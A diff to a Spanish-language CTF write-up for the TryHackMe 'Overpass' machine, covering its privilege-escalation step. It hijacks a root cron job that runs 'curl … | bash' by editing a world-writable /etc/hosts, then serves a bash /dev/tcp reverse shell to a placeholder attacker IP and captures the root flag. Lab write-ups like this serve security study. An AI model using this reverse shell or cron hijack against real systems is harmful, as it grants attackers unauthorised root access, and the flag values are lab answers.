@@ -152,24 +152,74 @@ thm{65c1aaf000506e56996822c6281e6bf7}
 
 ---
 
-## 4. Privilege Escalation (Escalada de Privilegios)
+## 4. Privilege Escalation ([[Escaladas de privilegios]])
 
 ### Enumeración Interna
-- 
+- Se revisan las tareas programadas del sistema con:
+
+```bash
+cat /etc/crontab
+```
+
+- Dentro del archivo aparece una tarea que se ejecuta **cada minuto como `root`**:
+
+```text
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+```
+
+- El cron descarga un script desde `overpass.thm` y lo ejecuta con `bash`, así que cualquier control sobre ese dominio permite ejecutar código como `root`.
+- Se comprueban los permisos de `/etc/hosts`:
+
+```bash
+ls -l /etc/hosts
+```
+
+```text
+-rw-rw-rw- 1 root root ... /etc/hosts
+```
+
+- El archivo es escribible por cualquier usuario, por lo que se puede modificar la resolución de `overpass.thm` y apuntarla a la máquina atacante.
 
 ### Explotación Local
-1. 
-2. 
-3. 
+1. Añadir una entrada en `/etc/hosts` para que `overpass.thm` resuelva a la IP del atacante.
+2. Crear en el atacante la ruta `downloads/src/` y colocar dentro `buildscript.sh` con una [[Reverse Shell|reverse shell]].
+3. Servir el directorio por HTTP en el puerto 80.
+4. Ponerse a la escucha con `netcat` en el puerto `4444`.
+5. Esperar a que el cron se ejecute (como máximo un minuto) y recibir la shell como `root`.
 
 ### Ejecución
 ```bash
+# En la máquina víctima
+echo "TU_IP overpass.thm" >> /etc/hosts
+```
 
+```bash
+# En la máquina atacante
+mkdir -p ~/exploit/downloads/src
+nano ~/exploit/downloads/src/buildscript.sh
+```
+
+Contenido de `buildscript.sh`:
+
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/TU_IP/4444 0>&1
+```
+
+```bash
+# Servir el script por HTTP
+cd ~/exploit
+sudo python3 -m http.server 80
+```
+
+```bash
+# En otra terminal, ponerse a la escucha
+nc -lvnp 4444
 ```
 
 **Prueba de acceso (Root/SYSTEM Flag):**
 ```bash
-
+thm{7f336f8c359dbac18d54fdd64ea753bb}
 ```
 
 ---
